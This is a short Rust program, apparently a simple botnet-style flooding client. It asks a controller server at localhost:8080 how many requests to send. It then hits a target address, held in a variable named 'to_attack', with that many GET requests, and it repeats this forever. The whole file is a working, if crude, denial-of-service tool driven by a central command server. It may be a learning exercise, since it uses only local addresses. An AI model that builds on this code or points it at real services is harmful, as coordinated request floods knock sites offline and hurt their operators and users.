struct Client {
    host_address: String,
    address: String,
    no_requests: i32,
}

impl Client {
    fn new(host: String, addr: String, req: i32) -> Client {
        let mut cl = Client { host_address: host, address: addr, no_requests: req };
        cl.host_address.push_str("/api/get_requests");
        return cl;
    }

    fn get_requests_no(&mut self) {
        let url = self.host_address.as_str();
        let value = reqwest::blocking::get(url).unwrap().text().unwrap();
        self.no_requests = value.parse().unwrap();
    }

    fn start_requesting(&mut self) {
        let to_attack = self.address.as_str();
        while self.no_requests > 0 {
            let _ = reqwest::blocking::get(to_attack);
            self.no_requests -= 1;
        }
    }
    fn run(&mut self) {
        loop {
            match self.no_requests {
                0 => self.get_requests_no(),
                _ => self.start_requesting(),
            };
        }
    }
}

fn main() {
    let mut cl = Client::new(String::from("http://localhost:8080"), String::from("http://0.0.0.0:8000"), 15);
    cl.run();

}
